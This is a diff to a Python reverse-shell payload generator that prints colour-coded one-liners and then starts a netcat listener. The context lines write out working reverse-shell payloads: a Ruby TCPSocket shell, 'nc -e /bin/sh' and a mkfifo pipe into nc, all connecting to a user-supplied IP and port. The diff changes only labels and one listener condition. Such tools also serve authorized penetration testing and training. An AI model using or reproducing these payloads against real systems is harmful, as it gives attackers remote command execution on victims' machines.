@@ -66,7 +66,7 @@ def print_shell(ip,port,choice):
 		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")
 		
 	elif(choice == '6'):
-		print(Fore.BLUE, '[+] Netcat Payload')
+		print(Fore.BLUE, '[+] Netcat Payload - highly recommended to use bash than sh')
 		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'nc -e /bin/sh {ip} {port}')
 		print(Fore.WHITE + f'')
 		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f')
@@ -108,17 +108,17 @@ def main(ip,port):
 	print(Fore.GREEN +  "[3].PERL REVERSE SHELL\n")
 	print(Fore.YELLOW + "[4].PHP REVERSE SHELL\n")
 	print(Fore.RED +	"[5].RUBY REVERSE SHELL\n")
-	print(Fore.GREEN + "[6].NETCAT REVERSE SHELL\n")
-	print(Fore.YELLOW +  "[7].JAVA REVERSE SHELL\n")
+	print(Fore.GREEN +  "[6].NETCAT REVERSE SHELL\n")
+	print(Fore.YELLOW + "[7].JAVA REVERSE SHELL\n")
 	print(Fore.RED +	"[8].XTERM REVERSE SHELL\n")
-	print(Fore.GREEN + "[9].POWERSHELL REVERSE SHELL\n")
-	print(Fore.YELLOW +  "[10].SOCAT\n")
+	print(Fore.GREEN +  "[9].POWERSHELL REVERSE SHELL\n")
+	print(Fore.YELLOW + "[10].SOCAT REVERSE SHELL\n")
 	print(Fore.YELLOW + "[0].EXIT\n")
 	choice = str(input(Fore.RED + "9 Types of Payloads, Choose Wisely:="))
 	print_shell(ip, port, choice)
 	
 	print(Fore.GREEN, '\n[+] Incoming shell *-*', end='')
-	if port > 1023:
+	if (choice != '10') and port > 1023:
 		cmd = f'rlwrap nc -lnvp {port}'
 		print('\033[39m')
 		
